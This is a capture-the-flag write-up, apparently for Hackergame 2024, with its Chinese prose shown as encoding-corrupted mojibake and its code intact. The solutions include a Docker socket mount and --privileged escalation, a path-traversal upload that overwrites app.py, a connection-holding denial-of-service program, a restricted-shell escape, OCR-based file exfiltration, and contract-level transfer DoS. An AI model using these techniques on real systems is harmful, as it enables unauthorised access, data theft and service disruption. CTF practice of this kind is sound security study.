é‚£å°±é€€è€Œæ±‚å…¶æ¬¡ï¼Œæˆ‘ç¬¬äºŒä¸ªæƒ³åˆ°çš„æ˜¯ OCRã€‚å…ˆç”¨ base85 å’Œ base64 æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°è¯†åˆ«å‡†ç¡®ç‡ä¸å¤Ÿç†æƒ³ã€‚ä½†æ˜¯æ‹·æ‰“ AI å¾—åˆ°äº†ä¸€ç¯‡[åšå®¢](https://www.monperrus.net/martin/perfect-ocr-digital-data) (Monperrus, 2020)ï¼Œé‡Œé¢æå‡ºè¯†åˆ«åå…­è¿›åˆ¶çš„å‡†ç¡®åº¦å¾ˆé«˜ã€‚

é‚£å°±å¼€å§‹å®ç°å§ã€‚é¦–å…ˆéœ€è¦æŠŠæ–‡ä»¶è½¬æˆåå…­è¿›åˆ¶ï¼Œè¿™éƒ¨åˆ†å¯ä»¥ç”¨ `xxd -p` å®ç°ã€‚ä½†æ˜¯ xxd è¾“å‡ºä¼šåœ¨ 80 ä¸ªå­—ç¬¦å¤„æ¢è¡Œï¼Œè¿™æ ·å ä¸æ»¡å±å¹•å¾ˆæ²¡æ•ˆç‡ã€‚æ‰€ä»¥å¯ä»¥æ¥ä¸€ä¸ª `tr -d "\n"`ã€‚

ç„¶åæ˜¯ä¸€ä¸ªå¡äº†æˆ‘æ¯”è¾ƒä¹…çš„é—®é¢˜ï¼Œè¾“å‡ºäº†è¿™ä¹ˆå¤šå­—ç¬¦æ€ä¹ˆä¸€ä¸ªä¸è½åœ°æ˜¾ç¤ºå‡ºæ¥ã€‚æˆ‘æ˜¯å¿«é€Ÿå†™äº†ä¸€ä¸ªç®€çŸ­çš„ python è„šæœ¬ï¼ˆä¿è¯æˆ‘èƒ½åœ¨ä¸¤åˆ†é’Ÿå†…æ•²å‡ºæ¥ï¼‰ã€‚

```python
import sys
import os
import time

s = os.get_terminal_size()
ct = s.columns * s.lines

i = sys.stdin.read()
ps = [i[j:j+ct] for j in range(0, len(i), ct)]

for s in ps:
    os.system('clear')
    print(s, end='', flush=True)
    sys.stdout.flush()
    time.sleep(0.7)

print("")
```

åªéœ€è¦å…¨å± Terminal ï¼ˆè¿˜å¯ä»¥å…ˆæ”¹åˆ†è¾¨ç‡ï¼‰ï¼Œå†è¿è¡Œ `xxd -p /secret | tr -d "\n" | python3 a.py`ï¼Œåº”è¯¥å°±å¥½äº†â€¦â€¦ ä¸æ˜¯ã€‚è¿™ä¸ª VNC å±…ç„¶ä¼šè·³å¸§ï¼Œäºæ˜¯è¿˜å¾—æ¥å›ä¿®æ”¹æ¯æ¬¡è¾“å‡ºé—´çš„å»¶æ—¶ã€‚æœ€åå°†ç»ˆç«¯ç”»é¢é€šè¿‡å±å¹•å½•åˆ¶å­˜ä¸‹æ¥ï¼Œé‚£æœ¬è´¨ä¸Šæˆ‘ä»¬å·²ç»æŠŠæ–‡ä»¶å¸¦å‡ºæ¥äº†ï¼Œåªå·®æ€ä¹ˆè¿˜åŸã€‚

é¦–å…ˆè€ƒè™‘åˆ°è¿™æ˜¯ä¸ªè§†é¢‘æ–‡ä»¶ï¼Œæˆ‘å…ˆç”¨ opencv å°†é‡å¤çš„å¸§å‰”é™¤ã€‚å…·ä½“æ¥è¯´ï¼Œå°†æ¯ä¸€å¸§äºŒå€¼åŒ–åä¸ä¸Šä¸€å¸§æ±‚å·®ï¼Œè‹¥ä¸åŒçš„åƒç´ æ•°é‡é«˜äºé˜ˆå€¼åˆ™è®¤ä¸ºæ˜¯ä¸åŒçš„å¸§è€Œä¿å­˜ä¸‹æ¥ã€‚

```python
def are_different_frames(a: cv2.UMat, b: cv2.UMat) -> bool:
    a = cv2.cvtColor(a, cv2.COLOR_BGR2GRAY)
    a = cv2.threshold(a, 200, 255, cv2.THRESH_BINARY)[1]
    b = cv2.cvtColor(b, cv2.COLOR_BGR2GRAY)
    b = cv2.threshold(b, 200, 255, cv2.THRESH_BINARY)[1]
    diff = cv2.absdiff(a, b)
    diff_pixel_count = cv2.countNonZero(diff)
    return diff_pixel_count > 37200
```

import Picture from "@components/Picture.astro";

<Picture
  src="https://img-cdn.akass.cn/12/2024/11/673022d3d6513.png!wp"
  darkSrc="https://img-cdn.akass.cn/12/2024/11/673023be23511.png!wp"
  alt="A figure comparing two different frames with histrogram and difference"
/>

å¯ä»¥çœ‹åˆ°æ•ˆæœè¿˜æ˜¯ä¸é”™çš„ã€‚

```python
cap = cv2.VideoCapture("data.mov")
ret, prev_frame = cap.read()
unique_frames = [prev_frame]
while True:
    ret, curr_frame = cap.read()
    if not ret:
        break
    if are_different_frames(prev_frame, curr_frame):
        unique_frames.append(curr_frame)
    prev_frame = curr_frame

cap.release()
```

é‚£ä¹ˆæ¥ä¸‹æ¥æ˜¯ OCR çš„ç¯èŠ‚ã€‚è¿™é‡Œæˆ‘é€‰ç”¨äº† PaddleOCRã€‚éœ€è¦æ³¨æ„å¸§çš„å°ºå¯¸å¤ªå¤§æ—¶ OCR åº“å¯èƒ½ä¼šåœ¨å‰å¤„ç†æ—¶è¿›è¡Œå‹ç¼©ï¼Œåœ¨ç°åœ¨è¿™ç§åœºæ™¯ä¸‹è¿™å¯¹å‡†ç¡®åº¦ä¼šæ˜¯æ¯ç­æ€§çš„æ‰“å‡»ã€‚ä¸è¿‡è¿™ä¸ªè¡Œä¸ºé€šå¸¸å¯ä»¥é€šè¿‡é…ç½®å…³é—­ã€‚

```python
from paddleocr import PaddleOCR

ocr = PaddleOCR(
    use_angle_cls=False,
    lang="en",
    det_limit_side_len=25600,
)

hex_texts = []
for frame in unique_frames:
    hex_texts.append("".join([line[1][0] for line in ocr.ocr(frame, cls=False)[0]]))

bytes_result = bytes.fromhex("".join(hex_texts))
with open("secret", "wb") as secret:
    secret.write(bytes_result)
    secret.close()
```

PaddleOCR ç¡®å®å‰å®³ï¼Œä¸€æ¬¡é€šè¿‡ã€‚

## Node.js is Web Scale

æ˜¯å¼€äº†æµè§ˆå™¨ Developer Tools åœ¨ Console é‡Œæ¨¡æ‹Ÿäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ª `__proto__` ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚

æœ€åå¬ https://www.youtube.com/watch?v=gCVTbfDecwI å¬æ‡‚çš„ã€‚

## Docker for Everyone Plus

è¿™é“é¢˜å¾ˆå¥½ï¼Œä½†æ˜¯ä½“éªŒä¸æ˜¯å¤ªå¥½ã€‚ä¸»è¦é—®é¢˜æ˜¯é¢˜ç›®ç¯å¢ƒè™šæ‹Ÿæœºå¯åŠ¨å¤ªæ…¢ï¼Œæ–‡ä»¶ä¸Šä¼ å›°éš¾ã€‚

### No Enough Privilege

é¦–å…ˆå‘ç°æˆ‘ä»¬å¯ä»¥ `sudo docker image load`ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯è¦ä¸Šä¼ ä¸€ä¸ªé•œåƒä¸Šå»çš„ã€‚å„ç§å¥‡æ€ªè€Œæ— æ•ˆçš„å°è¯•ç•¥ï¼Œæœ€åä½¿ç”¨ iTerm 2 + lrzsz + ç¥ç§˜è„šæœ¬ã€‚zmodem åˆå¥—ä¸Š nc é‚£æ˜¯åŒé‡çš„æ…¢ï¼Œè‡ªç„¶æˆ‘ä»¬å¸Œæœ›è¿™ä¸ªé•œåƒèƒ½å°ä¸€ç‚¹ï¼Œä¸ç„¶åŠ è½½å®Œé•œåƒå·²ç»æ²¡æ—¶é—´åšé¢˜äº†ã€‚

è¯´èµ·å°é•œåƒç¬¬ä¸€å°è±¡è‡ªç„¶æ˜¯ `scratch`ï¼Œç™½çº¸ä¸€å¼ å•¥éƒ½æ²¡æœ‰ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æœ€å°å¯ç”¨çš„å¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯ busyboxï¼Œä¸€æœæœç„¶æœ‰å®˜æ–¹é•œåƒï¼Œ`busybox:uclibc` ä»… 1.23Mï¼Œæˆ‘éƒ½æ‡’å¾—å† gzip ä¸€ä¸‹äº†ã€‚

é‚£ä¹ˆæˆ‘ä»¬å·²ç»å¯ä»¥ `sudo docker run --rm -u 1000:1000 -it busybox:uclibc` æ‹¿åˆ°ä¸€ä¸ªæˆ‘ä»¬æœ‰å®Œå…¨æ§åˆ¶çš„ shell äº†ã€‚

`ls -ln` çœ‹åˆ° `/flag` åœ¨ `0(root)` ç»„å†…ä¹Ÿæ˜¯å¯ä»¥è¯»çš„ï¼Œæ¥ç€çœ‹è¢«è¿æ¥çš„ `/dev/vdb`ï¼ŒåŒæ ·ç»„å†…å¯è¯»ï¼Œä¸è¿‡ç»„æ˜¯ `6(disk)`ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ç»™å®¹å™¨åŠ ä¸Šè¿™äº›ç»„ï¼Œå†è®©å®ƒèƒ½è¯»è®¾å¤‡ã€‚

```sh
sudo docker run --rm -u 1000:1000 -it --group-add 0 --group-add 6 --privileged -v /flag:/flag busybox:uclibc
cat /flag
```

æ‹¿åˆ°ç¬¬ä¸€ä¸ª flagã€‚

### Unbreakable!

çœ‹åˆ° `docker run` è¢«åŠ äº†è¿™ä¹ˆå¤šé™åˆ¶ï¼Œæˆ‘æ˜¯æ€’ä»å¿ƒå¤´èµ·ï¼Œç›´æ¥ä¸ç”¨ä½ ç»™æˆ‘çš„ `sudo docker run` äº†ã€‚

å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œä¼—æ‰€å‘¨çŸ¥ `docker` æœ¬è´¨åªæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œå…¶é€šè¿‡ `/var/run/docker.sock` å‘ Docker Daemon äº¤äº’ã€‚é‚£ä¹ˆæˆ‘çš„æ€è·¯å°±æ˜¯æŠŠè¿™ä¸ª .sock æ˜ å°„è¿›è‡ªå·±çš„å®¹å™¨é‡Œï¼Œå†ç”¨è‡ªå·±ï¼ˆä» host æ˜ å°„æ¥ï¼‰çš„ docker cli äº¤äº’ã€‚ä½†æ˜¯ Docker Daemon å°±é‚£ä¸€ä¸ªè·‘åœ¨å®¿ä¸»æœºä¸Šï¼Œæ‰€ä»¥ç›¸å½“äºå¾—åˆ°äº†å®Œæ•´çš„ docker cliã€‚

è¿™é‡Œåªæœ‰ä¸€ä¸ªå°å°çš„é—®é¢˜ï¼Œ`docker` åœ¨ `busybox:uclibc` é‡Œç¼ºè¿è¡Œåº“æã€‚åœ¨å®¿ä¸»æœºä¸Š `ldd` çœ‹ä¸€çœ¼ï¼Œä½¿ç”¨çš„æ˜¯ muslã€‚é‚£æˆ‘ä»¬å¹²è„†å°±ä¼ ä¸ª alpine é•œåƒå§ã€‚`gzip -9` ä»¥åå¤§æ¦‚ 3.5Mï¼Œä¹Ÿèƒ½æ¥å—ã€‚

```sh
sudo docker run --rm --security-opt=no-new-privileges -u 1000:1000 --group-add 103 -it -v /var/run/docker.sock:/var/run/docker.sock:rw -v /usr/bin/docker:/usr/bin/docker alpine
docker run -it --rm --group-add 0 --group-add 6 --privileged -v /flag:/flag alpine
cat /flag
```

## ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿

åˆå‡ºç°äº†æ–‡ä»¶ä¸Šä¼ å›°éš¾ï¼Œåé¢ç±»ä¼¼éœ€è¦ä¼ äºŒè¿›åˆ¶çš„é¢˜éƒ½æœ‰åŒæ ·æƒ…å†µã€‚

### What DBus Gonna Do?

ç®€å•æ‹·æ‰“ AI å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‘½ä»¤å°±èƒ½è§£å†³ã€‚

```sh
#!/bin/sh

dbus-send --print-reply --dest=cn.edu.ustc.lug.hack.FlagService /cn/edu/ustc/lug/hack/FlagService cn.edu.ustc.lug.hack.FlagService.GetFlag1 string:com.pgaur.GDBUS string:"Please give me flag1"
```

### If I Could Be A File Descriptor

å¯¹ç€é¢˜ç›®é™„ä»¶ç»™çš„ `getflag3.c` ç…§çŒ«ç”»è™å†™äº†ä¸€ä¸ªã€‚å¯ä»¥ä¼ ä¸€ä¸ª pipe è¿‡å»ã€‚å‘ç‚¹åœ¨äºæ¥å— fd å±…ç„¶æ˜¯åœ¨å¦å¤–çš„å‚æ•°ï¼Œæ‰€ä»¥è¦ç”¨å¦å¤–çš„å‡½æ•°ã€‚

```c
connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);

int pipefd[2];
int fd = pipefd[1];

const char *message = "Please give me flag2\n";
size_t message_length = strlen(message);

if (write(fd, message, message_length) != message_length) {
  perror("write failed");
  close(fd);
  return EXIT_FAILURE;
}
close(fd);

int rfd = pipefd[0];

result = g_dbus_connection_call_with_unix_fd_list_sync(
    connection, DEST, OBJECT_PATH, INTERFACE, METHOD, g_variant_new("(h)", 0),
    g_variant_type_new("(s)"), G_DBUS_CALL_FLAGS_NONE, -1,
    g_unix_fd_list_new_from_array(&rfd, 1), NULL, NULL, &error);

if (result) {
  gchar *flag;
  g_variant_get(result, "(&s)", &flag);
  g_print("%s", flag);
  g_variant_unref(result);
} else {
  g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
  g_error_free(error);
}
```

ç„¶åç¼–è¯‘ä¹Ÿç…§ç€ç»™çš„ `Makefile` ç”¨ pkg-config ã€‚ä½†æ˜¯é—®é¢˜å°±æ˜¯è¿™ä¸ªç¼–è¯‘å‡ºæ¥çš„äºŒè¿›åˆ¶ï¼Œä¼ ä¸Šå»ä¸è¿è¡Œï¼

æŠ¥çš„ `file not found`ï¼Œä¼°æ‘¸ç€æ˜¯åŠ¨æ€é“¾æ¥çš„é—®é¢˜ï¼Œé‚£å°±ç¼–è¯‘æˆé™æ€æ–‡ä»¶å§ã€‚é¦–å…ˆè¦å¯¹ç¼–è¯‘å‘½ä»¤ä½œå‡ºä¸€äº›ä¿®æ”¹

```makefile
flag2: flag2.c
	gcc -static `pkg-config --static --cflags blkid glib-2.0 gio-2.0` flag2.c -o flag2 `pkg-config --static --libs blkid glib-2.0 gio-2.0`
```

ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ª nix package æ¥åˆ›é€ ä¸€ä¸ªåˆé€‚çš„ç¼–è¯‘ç¯å¢ƒ

```nix
flag2 = pkgs.stdenv.mkDerivation {
  pname = "flag2";
  version = "1.0";

  src = ./src;

  buildInputs =
    (with pkgs.pkgsStatic; [
      glib
      pcre2
      libselinux
      libsepol
    ])
    ++ (with pkgs; [
      musl
      util-linux

      gcc13
      gnumake
      pkg-config
    ]);

  nativeBuildInputs = with pkgs; [ gcc13 ];

  buildPhase = ''
    make clean
    make flag2
  '';

  installPhase = ''
    mkdir -p $out
    cp flag2 $out
  '';
};
```

`nix build .#flag2` åä¸Šä¼  `./result/flag2` å³å¯ã€‚

### Comm Say Maybe

æ‹·æ‰“ AI å¾—çŸ¥å¯ä»¥é€šè¿‡ prctl æ”¹è‡ªå·±çš„ `/proc/self/comm`ã€‚ç„¶åè¿˜ç»™äº†ä¸ªç”¨ GNU D-Bus çš„ codeï¼Œæˆ‘è§‰å¾—æ¯”é¢˜ç›®ç»™çš„ gio æ›´å¯è¯»ä¸€ç‚¹ã€‚

```c
connection = dbus_bus_get(DBUS_BUS_SYSTEM, &error);
message = dbus_message_new_method_call(DEST, OBJECT_PATH, INTERFACE, METHOD);

const char *payload = "getflag3";
if (prctl(PR_SET_NAME, (unsigned long)payload, 0, 0, 0) != 0) {
  perror("prctl");
  return EXIT_FAILURE;
}

reply = dbus_connection_send_with_reply_and_block(connection, message, -1,
                                                  &error);

if (dbus_message_iter_init(reply, &args)) {
  if (DBUS_TYPE_STRING == dbus_message_iter_get_arg_type(&args)) {
    dbus_message_iter_get_basic(&args, &result);
    printf("Received response: %s\n", result);
  } else {
    fprintf(stderr, "Unexpected response type\n");
  }
} else {
  fprintf(stderr, "No response arguments\n");
}
```

## ç¦æ­¢å†…å·

å®¡è®¡æºä»£ç å‘ç°æ²¡æœ‰å¯¹æ–‡ä»¶ååšä»»ä½•æ£€æŸ¥å°±ä¼šç›´æ¥å†™å…¥ã€‚å‹å–„åœ°è¯· AI å¸®æˆ‘åœ¨å‰ç«¯é¡µé¢å†™äº†ä¸ª js å‡½æ•°æ¥è‡ªå®šä¹‰æ–‡ä»¶åã€‚

æ³¨æ„åˆ°é¢˜é¢ç»™å‡ºçš„ã€Œå®Œæ•´ã€å¯åŠ¨å‘½ä»¤ä¸­æ²¡æœ‰ç»™å‡ºæ–‡ä»¶åã€‚ä» [Flask æ–‡æ¡£](https://flask.palletsprojects.com/en/stable/quickstart/)å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªè‡ªåŠ¨å‘ç°çš„è¡Œä¸ºï¼Œé‚£ä¹ˆæ–‡ä»¶åå¤§æ¦‚ç‡æ˜¯ `app.py` æˆ–è€… `wsgi.py`ã€‚

æœ€åä¸Šä¼  `../web/app.py`

```python
@app.route("/", methods=["GET"])
def index():
    with open("answers.json") as f:
        answers = json.load(f)
    return json.dumps(answers)
```

æ•°æ®å¤„ç†å°±å¾ˆç®€å•äº†

```python
"".join(chr(i) for i in data)
```

## åŠ¨ç”»åˆ†äº«

### åªè¦ä¸åœä¸‹ ï¼ˆåç•¥ï¼‰

å®¡è®¡æºä»£ç å‘ç°è¿™ä¸ªæœåŠ¡å™¨æ˜¯å•çº¿ç¨‹çš„ã€‚è€Œ TCP æ˜¯æœ‰çŠ¶æ€çš„ï¼Œæˆ‘ä»¬å¯ä»¥å»ºç«‹ä¸€ä¸ª TCP è¿æ¥è€Œä¸å‘é€ä»»ä½•ä¿¡æ¯ï¼Œäºæ˜¯æœåŠ¡å™¨å°±ä¼šè¢«å¡æ­»ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦è®©æäº¤çš„ç¨‹åºå…ˆè¡Œè¿”å›æ‰èƒ½è§¦å‘åˆ¤å®š flag çš„æœºåˆ¶ã€‚å¯ä»¥ fork ä¸€ä¸ªè¿›ç¨‹å‡ºæ¥ç„¶åè®©å­è¿›ç¨‹ç¡å¤§è§‰ã€‚

```c
void open_connections() {
  int sockets[NUM_CONNECTIONS];
  struct sockaddr_in server_addr;
  char *server_ip = "127.0.0.1";
  int port = 8000;

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
    perror("Invalid address or address not supported");
    exit(EXIT_FAILURE);
  }

  for (int i = 0; i < NUM_CONNECTIONS; i++) {
    sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
    if (sockets[i] < 0) {
      perror("Socket creation error");
      exit(EXIT_FAILURE);
    }

    if (connect(sockets[i], (struct sockaddr *)&server_addr,
                sizeof(server_addr)) < 0) {
      perror("Connection failed");
      close(sockets[i]);
      exit(EXIT_FAILURE);
    }
  }

  sleep(300);
}

int main() {
  pid_t pid = fork();

  if (pid < 0) {
    perror("Fork failed");
    return 1;
  } else if (pid == 0) {
    open_connections();
    exit(0);
  } else {
    printf("Parent process returning immediately.\n");
    return 0;
  }
}
```

### å¸Œæœ›çš„ç»ˆç«¯ ï¼ˆåç•¥ï¼‰

æ²¡åšå‡ºæ¥ã€‚ä»¥ä¸ºæ˜¯è·Ÿ X Server æœ‰å…³ã€‚

## å…³ç¯

### Easy - Hard

è·ŸäºŒç»´çš„å…³ç¯æ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼ŒåŒæ ·å¯ä»¥ç”¨çº¿ä»£è®¡ç®—ã€‚äºæ˜¯é«˜æ–¯æ¶ˆå…ƒçš„ä»£ç éƒ½æ²¡åŠ¨ã€‚åªéœ€è¦å¤„ç†ä¸€ä¸‹å¦‚ä½•æŠŠä¸‰ç»´å±•å¼€åˆ°ä¸€ç»´ã€‚

```python
def get_index(x: int, y: int, z: int) -> int:
    return x * n * n + y * n + z


def create_matrix():
    A = np.zeros((n * n * n, n * n * n), dtype=int)

    for i in range(n):
        for j in range(n):
            for k in range(n):
                index = get_index(i, j, k)
                A[index][index] = 1

                if i + 1 < n:
                    A[index][get_index(i + 1, j, k)] = 1
                if i - 1 >= 0:
                    A[index][get_index(i - 1, j, k)] = 1
                if j + 1 < n:
                    A[index][get_index(i, j + 1, k)] = 1
                if j - 1 >= 0:
                    A[index][get_index(i, j - 1, k)] = 1
                if k + 1 < n:
                    A[index][get_index(i, j, k + 1)] = 1
                if k - 1 >= 0:
                    A[index][get_index(i, j, k - 1)] = 1

    return A

def gauss(A, b):
    n = len(b)
    for i in range(n):
        pivot_row = i + np.argmax(A[i:, i])
        if A[pivot_row, i] == 0:
            continue

        A[[i, pivot_row]] = A[[pivot_row, i]]
        b[[i, pivot_row]] = b[[pivot_row, i]]

        for j in range(i + 1, n):
            if A[j, i] == 1:
                A[j] ^= A[i]
                b[j] ^= b[i]

    x = np.zeros(n, dtype=int)
    for i in range(n - 1, -1, -1):
        x[i] = b[i]
        for j in range(i + 1, n):
            x[i] ^= A[i][j] * x[j]

    return x

b = np.array(initial_state, dtype=int)
solution = gauss(A, b)
```

## PowerfulShell

é¦–å…ˆæˆ‘ä»¬å¤§è‡´çœ‹ä¸€ä¸‹è¿˜å‰©ä¸‹å“ªäº›å­—ç¬¦å¯ç”¨ï¼š`` `$|[]{}~-_=+:``

çœ‹åˆ° `$` å°±çŸ¥é“å¤§æ¦‚æ˜¯è¦å„ç§ç¥å¥‡çš„å˜é‡å±•å¼€äº†ã€‚è€Œä¸”åªæœ‰ `0` è¢«ç¦æ‰äº†ï¼ˆä¸ç„¶å°±å¤ªç®€å•äº†ï¼‰ä¹Ÿæ˜¯ç›´æ¥å°è¯äº†æˆ‘çš„æƒ³æ³•ã€‚äºæ˜¯ç¿» bash æ‰‹å†Œå»äº†ã€‚æœ€åé€‰å‡ºæ¥ `~` = `/players` ï¼Œ`$-` = `hB`ã€‚ä¸€çœ‹ `s h` é½å…¨äº†ï¼Œæƒ³åŠæ³•æ‹¼åœ¨ä¸€èµ·å°±å¥½äº†ã€‚

å¯ä»¥çœ‹åˆ° bash æœ‰ä¸€ä¸ªå†™æ³•æ˜¯ `${parameter:offset:length}` ï¼Œä¸è¿‡ `h` åœ¨ offset 0 ä¸èƒ½ç›´æ¥å†™ï¼Œå¯ä»¥å€’è¿‡æ¥å½“æˆ offset -2 ã€‚

```sh
__=~    #/players
___=$-  #hB
${__: -1: 1}${___: -2: 1}
cat ../flag
```

## ä¸å®½çš„å®½å­—ç¬¦

ç¤¼è²Œè¯¢é—® AI å¾—çŸ¥åœ¨ Windows ä¸Š wchar_t æ˜¯ UTF16-LEï¼Œè€Œä¸” `std::wstring::c_str()` ç»™çš„æ˜¯ä¸ª `wchar_t*`ã€‚ç„¶åèªæ˜çš„å° A å¸®æˆ‘ä»¬å¼ºè½¬æˆäº† `char*`ã€‚ä¼—æ‰€å‘¨çŸ¥ä¸€ä¸ª `char*` ä¼šç»“æŸåœ¨ `\0`ã€‚é‚£ä¹ˆç›®æ ‡å°±æ˜¯æ„é€ ä¸€ä¸ªå 8 ä½ä¸º 0 çš„ UTF16-LEã€‚

å…ˆæŠŠ `theflag` è½¬æˆ ASCIIï¼Œå‘ç°æ­£å¥½æ˜¯ 7 å­—èŠ‚ï¼š`74 68 65 66 6c 61 67`

é‚£ä¹ˆè¡¥ä¸€ä¸ª 00 å¾—åˆ° `74 68 65 66 6c 61 67 00`ï¼ŒæŒ‰ UTF16-LE è§£ç å³å¯ï¼š`æ¡´æ™¥æ…¬g`ã€‚

## ä¼˜é›…çš„ä¸ç­‰å¼

### Easy

ä¸€å¼€å§‹æˆ‘çœ‹æ ·ä¾‹é‡Œé¢ç»™çš„

$$
f(x) = g(x) + h(x) \quad \text{where} \int_0^1 g(x)=\pi
$$

å½¢å¼æŒºå¥½çš„ï¼Œå°±è¿™ä¹ˆè§£ä¸€ä¸‹å§ã€‚çœ‹äº†ä¸€ä¸‹ `h(x)` çš„åº¦å¤ªä½ï¼Œä¸å¦¨å…ˆæ¥ä¸ª 2 æ¨ç€ç©ã€‚

$$
\begin{aligned}
     h(x) &= a(1-x^2) \\
    \int_0^1  h(x) &= \int_0^1 a(1-x^2) \\
        &= a\left[\int_0^1\ 1 - \int_0^1 x^2\right] \\
        &= \dfrac{2}{3}a
\end{aligned}
$$

é‚£ä¹ˆä»¤ $h(x) = 8/3$ï¼Œå¾—åˆ° $a = 4$ã€‚å³ $f(x) = 4\sqrt{1-x^2} - 4(1-x^2)$ ã€‚

### Hard

ç»“æœæˆ‘æ˜¯åœ¨è¿™ä¸ªæ–¹å‘ä¸Šæ‰§è¿·ä¸æ‚Ÿå•Šï¼Œæ¨äº†åŠå¤©éƒ½æ²¡å»ç®¡ $g(x)$ ã€‚ç„¶åä¸€çœ‹ï¼Œè¿™æäº¤é•¿åº¦é™åˆ¶åªæœ‰ 400ï¼Œæ„Ÿè§‰è¿™ä¸ªæ–¹å‘æ˜¯é”™çš„ã€‚é‚£å°±ç›´æ¥æ„é€  $\int_0^1 f(x) = \pi - p/q$ å§ã€‚

æœåˆ° Lucas ([2009](https://doi.org/10.1080/00029890.2009.11920923)) è¿‘ä¸€æ­¥æ‹“å±•äº†

$$
I_{m,n}=\int_0^1 \dfrac{x^m(1-x)^n}{1+x^2}=a+b\pi+c\ln{2}
$$

æŒ‡å‡º

$$
I_{m,n}=\int_0^1 \dfrac{x^m(1-x)^n(a+bx+cx^2)}{1+x^2}=a+b\pi+c\ln{2}
$$

å¯ä»¥çœ‹åˆ°åœ¨æœ‰è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœ $(a+bx+cx^2) \geq 0, \forall x \in [0,1]$ åˆ™ $\dfrac{x^m(1-x)^n(a+bx+cx^2)}{1+x^2} \geq0, \forall x \in [0,1]$

é‚£ä¹ˆæˆ‘ä»¬åœ¨æƒ³è¦ $I_{m,n} = \pi - p/q$ çš„æƒ…å†µä¸‹ï¼Œåªéœ€è¦æ±‚è§£

$$
\begin{cases}
    a=p/q \\
    b=1 \\
    c=0
\end{cases}
$$

ä¸‰ä¸ªæ–¹ç¨‹å³å¯å¾—åˆ° $f(x)$ äº†ã€‚

æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•é€‰æ‹© $m,n$ ã€‚å¤§åŠ›æšä¸¾å‘ç° $m,n$ è¶Šå¤§æœ‰è§£çš„ $\pi - p/q$ å°±è¶Šå°ï¼Œè€Œä¸”ä¸ä¼šå½±å“å¤§çš„ $\pi - p/q$ã€‚æœ€åä¸»è¦è€ƒè™‘åˆ° 400 å­—ç¬¦çš„æäº¤é™åˆ¶ï¼Œå·®ä¸å¤šé€‰äº†ä¸€ä¸ªã€‚

```python
m = 82
n = 81
integrand = x**m * (1 - x) ** n * (a + b * x + c * x**2) / (1 + x**2)
integral = sp.simplify(sp.integrate(integrand, (x, 0, 1)))

eq1, eq2, eq3 = 0, 0, 0

for term in integral.args:
    term_dpi = term / sp.pi
    if term.is_Symbol or (
        term.is_Mul
        and len(term.args) == 2
        and (
            (term.args[0].is_Symbol and term.args[1].is_Rational)
            or (term.args[1].is_Symbol and term.args[0].is_Rational)
        )
    ):
        eq1 += term
    elif term_dpi.is_Symbol or (
        term_dpi.is_Mul
        and len(term_dpi.args) == 2
        and (
            (term_dpi.args[0].is_Symbol and term_dpi.args[1].is_Rational)
            or (term_dpi.args[1].is_Symbol and term_dpi.args[0].is_Rational)
        )
    ):
        eq2 += term_dpi
    else:
        eq3 += term / sp.log(2)

def compute_integral_and_solve(p: int, q: int) -> str:
    solution = sp.solve(
        [eq1 + sp.Rational(p, q), eq2 - 1, eq3],
        (a, b, c),
        rational=True,
        dict=True,
    )
    if not len(solution):
        return

    ra = solution[0][a]
    rb = solution[0][b]
    rc = solution[0][c]

    domain = sp.Interval(0, 1)
    gtz = sp.solveset((ra + rb * x + rc * x**2) >= 0, x, domain) == domain

    if gtz:
        ans_str = str(sp.simplify(x**m * (1 - x) ** n * (ra + rb * x + rc * x**2) / (1 + x**2)))
        return ans_str
```

## é“¾ä¸Šè½¬è´¦åŠ©æ‰‹

ä»æ¥æ²¡æ¥è§¦è¿‡ Web3 å’Œ Solidityï¼Œå…¨é æ‹·æ‰“ AIã€‚

### è½¬è´¦å¤±è´¥

`batchTransfer` ä¼šé€šè¿‡ `.transfer` è°ƒç”¨æˆ‘ä»¬å†™çš„åˆçº¦ä¸­çš„ `payable` å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©åœ¨è¿™ä¸ªå‡½æ•°ä¸­æ‹’ç»è¿™ä¸ª transferã€‚

```solidity
contract BatchTransfer {
    fallback() external payable {
        require(false, "never accept");
    }
}
```

### è½¬è´¦åˆå¤±è´¥

Solidity ä¸­æ¯ä¸ªæ“ä½œéƒ½ä¼šæ¶ˆè€—ä¸€å®šçš„ gasï¼Œè€Œå¦‚æœè€—å°½ä¼šç›´æ¥å›æ»šæ•´ä¸ªå—ã€‚

```solidity
contract BatchTransfer {
    address sender;

    function stalling1() internal {
        stalling2();
    }

    function stalling2() internal {
        stalling1();
    }

    receive() external payable {
        sender = msg.sender;
        require(msg.value > 0);

        stalling1();
    }
}
```

## LESS æ–‡ä»¶æŸ¥çœ‹å™¨åœ¨çº¿ç‰ˆ

å¼€çš„æœ€åä¸€é“é¢˜ã€‚å…¶å®å·²ç»æŸ¥åˆ° lesspipe äº†ã€‚ä½†æ˜¯åæ¥å‡ºå»é€›è¡—äº†æ²¡ç»§ç»­åšã€‚
